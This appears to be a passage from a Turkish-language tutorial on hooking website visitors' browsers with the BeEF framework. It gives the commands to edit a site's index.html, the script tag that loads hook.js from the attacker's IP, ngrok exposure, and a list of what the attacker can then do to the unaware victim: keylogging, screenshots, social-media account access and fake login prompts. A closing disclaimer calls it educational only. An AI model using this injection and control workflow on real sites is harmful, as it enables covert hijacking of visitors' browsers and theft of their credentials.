**1. BeEF Arayüzüne Erişim 🖥️**
- BeEF'i başlattıktan sonra terminalde **iki önemli URL** görünecek:
  - 🎛️ **UI URL:** `http://localhost:3000/ui/panel`
    - _Burası sizin kontrol paneliniz!_
  - 🎣 **Hook URL:** `http://localhost:3000/hook.js`
    - _Bunu hedef sitelere enjekte edeceğiz!_

**2. Web Sitesine Hook Ekleme 📄**
```bash
# HTML dosyasını düzenlemek için:
cd /var/www/html
sudo nano index.html
```

**Eklenmesi Gereken Kod:**
```html
<!-- Diğer script tag'lerinin yanına veya </body> etiketinden önce ekle: -->
<script src="http://YOUR_IP:3000/hook.js"></script>
```

---

### 🎯 Saldırı Senaryosu ve İşleyiş ⚡

**1. Kurbanın Deneyimi:**
- 🎮 Kurban, oyunu normal şekilde oynar
- 🔍 Hiçbir şeyden haberi olmaz
- ⚠️ Tarayıcısı arka planda **BeEF kontrolüne** girer

**2. Saldırganın Kontrolü:**
- 🖥️ BeEF panelinde kurbanın tarayıcısı görünür
- 🎯 **Hook araçları** ile şunlar yapılabilir:
  - 🔑 Tuş kaydetme (Keylogger)
  - 📸 Ekran görüntüsü alma
  - 🔗 Sosyal medya hesaplarına erişim
  - 🎭 Sahte oturum açtırma
  - 📊 Bilgi toplama

---

### ✅ Son Kontrol Listesi 📋

- [ ] BeEF çalışıyor mu? (`http://localhost:3000/ui/panel`)
- [ ] Hook URL doğru mu?
- [ ] HTML dosyasına hook eklendi mi?
- [ ] Web sitesi erişilebilir mi?
- [ ] Ngrok aktif mi? (Dış ağ için)
- [ ] Kurban siteyi ziyaret etti mi?

---

### ⚠️ Güvenlik Uyarıları 🛡️

- ❗ **BU SADECE EĞİTİM İÇİNDIR!**
- 🔒 **Kendi lab ortamında test et!**
- ⚖️ **Yazılı izin olmadan asla kullanma!**
- 📊 **Saldırı tespit sistemleri bunu fark edebilir**

---

**Özet:** BeEF'i başlat ➕ Hook'u siteye ekle ➕ Kurbanı bekleyip panelden kontrol et! 🎣  
**Not:** Kurban siteye girdiğinde, BeEF panelinde **online browsers** kısmında görünecek! ✅